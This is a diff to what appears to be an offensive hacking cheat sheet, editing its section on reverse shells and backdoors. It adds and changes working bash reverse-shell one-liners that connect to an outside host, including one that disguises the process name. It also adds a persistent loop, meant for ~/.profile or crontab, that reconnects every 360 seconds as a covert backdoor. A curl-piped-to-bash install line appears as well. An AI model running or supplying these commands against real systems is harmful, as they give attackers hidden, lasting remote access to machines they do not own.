@@ -45,7 +45,7 @@ Got tricks? Join us [https://thc.org/ops](https://thc.org/ops)
 1. [Data Upload/Download/Exfil](#exfil)
    1. [File Encoding/Decoding](#file-encoding)
    1. [File transfer using cut & paste](#cut-paste)
-   1. [File transfer using screen](#xfer-tmux)
+   1. [File transfer using tmux](#xfer-tmux)
    1. [File transfer using screen](#file-transfer-screen)
    1. [File transfer using gs-netcat and sftp](#file-transfer-gs-netcat)
    1. [File transfer using HTTP](#http)
@@ -72,7 +72,6 @@ Got tricks? Join us [https://thc.org/ops](https://thc.org/ops)
       1. [Upgrade a reverse shell to a fully interactive shell](#reverse-shell-interactive)
       1. [Reverse shell with socat (fully interactive)](#reverse-shell-socat)
 1. [Backdoors](#backdoor)
-   1. [Background reverse shell](#backdoor-background-reverse-shell)
    1. [authorized_keys](#backdoor-auth-keys)
    1. [Remote access an entire network](#backdoor-network)
    1. [Smallest PHP backdoor](#php-backdoor)
@@ -1525,11 +1524,17 @@ pwncat -lp 1524
 On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
 ```sh
 # If the current shell is Bash already:
-(bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &
+(bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &) 
 # If the current shell is NOT Bash then we need:
-bash -c '(exec bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &'
+bash -c '(exec bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &)'
 # or hide the bash process as 'kqueue'
-bash -c '(exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &'
+bash -c '(exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &)'
+```
+
+Alternatively, on the remote system, put this into the `~/.profile` or crontab to re-start the connect-back shell (and also stiops multiple intances from being started):
+
+```sh
+fuser /dev/shm/.busy &>/dev/null || (bash -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 360; done' &>/dev/null &)
 ```
 
 <a id="curlshell"></a>
@@ -1754,6 +1759,9 @@ LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/ys)"  # Notice '/ys' in
 ```
 
 <a id="backdoor-background-reverse-shell"></a>
+
+See also [asdf](#reverse-shell).
+
 **6.i. Background reverse shell**
 
 A reverse shell that keeps trying to connect back to us every 360 seconds (indefinitely). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected. 
